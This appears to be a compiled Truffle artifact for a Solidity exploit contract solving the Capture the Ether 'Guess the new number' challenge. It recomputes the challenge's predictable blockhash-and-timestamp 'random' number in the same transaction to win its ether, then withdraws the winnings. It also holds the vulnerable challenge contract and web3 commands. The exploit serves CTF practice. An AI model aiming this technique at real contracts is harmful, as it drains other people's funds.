{
  "contractName": "CheatTheNewNumber",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "getOtherContract",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "newAddr",
          "type": "address"
        }
      ],
      "name": "setOtherContract",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "otherContract",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "caller",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "newAddress",
          "type": "address"
        }
      ],
      "name": "SetOtherContract",
      "type": "event"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "isComplete",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "guess",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "balance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x606060405260008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550341561005057600080fd5b6106778061005f6000396000f300606060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630b4b51981461008557806335a28f3e146100da5780633ccfd60b14610113578063a28b749a14610128578063b2fa1c9e14610132578063b69ef8a81461015f578063e98d36e114610188575b005b341561009057600080fd5b6100986101dd565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34156100e557600080fd5b610111600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610206565b005b341561011e57600080fd5b6101266102e0565b005b610130610339565b005b341561013d57600080fd5b6101456104a7565b604051808215151515815260200191505060405180910390f35b341561016a57600080fd5b61017261059a565b6040518082815260200191505060405180910390f35b341561019357600080fd5b61019b610626565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055507f081eb3239ea805b9a08e7c4f93baacc9d1965ecde599e5ed9b2b3936cd3fe0b83382604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019250505060405180910390a150565b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050151561033757600080fd5b565b60008060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415151561038357600080fd5b6001430340426040518083600019166000191681526020018281526020019250505060405180910390206001900491506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff16634ba4c16b34846040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808260ff1660ff1681526020019150506000604051808303818588803b151561044b57600080fd5b5af1151561045857600080fd5b5050505060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311415156104a357600080fd5b5050565b6000806000806000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16141515156104f257600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1691508173ffffffffffffffffffffffffffffffffffffffff1663b2fa1c9e6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b151561057957600080fd5b5af1151561058657600080fd5b505050604051805190509050809250505090565b60008060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16141515156105e457600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163190508091505090565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16815600a165627a7a72305820241f998c7fc1eb40b2d9081cdeba13ff3e91452f22ed4f5e7e481e268acca2e00029",
  "source": "pragma solidity 0.4.21;\r\n\r\nimport './OtherContract.sol';\r\n\r\n/*\r\nconst oneEth = web3.utils.toWei('1', 'ether');\r\nvar cheatTheNewNumber = await CheatTheNewNumber.deployed();\r\nvar balance = await cheatTheNewNumber.balance();\r\nweb3.utils.fromWei(balance);\r\nawait cheatTheNewNumber.guess({from: accounts[0], value: oneEth});\r\nawait cheatTheNewNumber.isComplete();\r\n\r\n// ropsten balance\r\nweb3.eth.getBalance('0xd20FF949eb2A487823828B9E14Ab39cF8C31eb11')\r\n\r\n\r\n// development balance\r\nweb3.eth.getBalance('0x3C5a99d8f3b559618e56D993E73f10e4406699d5')\r\n*/\r\n\r\ncontract CheatTheNewNumber is OtherContract {\r\n\r\n    function isComplete() public view returns (bool) {\r\n        require(otherContract != 0);\r\n        GuessTheNewNumberChallenge guessTheNewNumberChallenge = GuessTheNewNumberChallenge(otherContract);\r\n        bool completed = guessTheNewNumberChallenge.isComplete();\r\n        return completed;\r\n    }\r\n\r\n    function guess() public payable {\r\n        require(otherContract != 0);\r\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\r\n\r\n        GuessTheNewNumberChallenge guessTheNewNumberChallenge = GuessTheNewNumberChallenge(otherContract);\r\n        guessTheNewNumberChallenge.guess.value(msg.value)(answer);\r\n\r\n        // only allow success if the guess was right\r\n        require(address(otherContract).balance == 0);\r\n    }\r\n\r\n    function balance() public view returns (uint256) {\r\n        require(otherContract != 0);\r\n        uint256 contractBalance = address(otherContract).balance;\r\n        return contractBalance;\r\n    }\r\n\r\n    function() public payable {\r\n    }\r\n\r\n    function withdraw() public { \r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n}\r\n\r\ncontract GuessTheNewNumberChallenge {\r\n    function GuessTheNewNumberChallenge() public payable {\r\n        require(msg.value == 1 ether);\r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        return address(this).balance == 0;\r\n    }\r\n\r\n    function guess(uint8 n) public payable {\r\n        require(msg.value == 1 ether);\r\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\r\n\r\n        if (n == answer) {\r\n            msg.sender.transfer(2 ether);\r\n        }\r\n    }\r\n}\r\n",
  "sourcePath": "C:\\defi\\capturetheether\\contracts\\GuessTheNewNumberChallenge.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.21+commit.dfe3193c.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-11-11T16:06:44.637Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}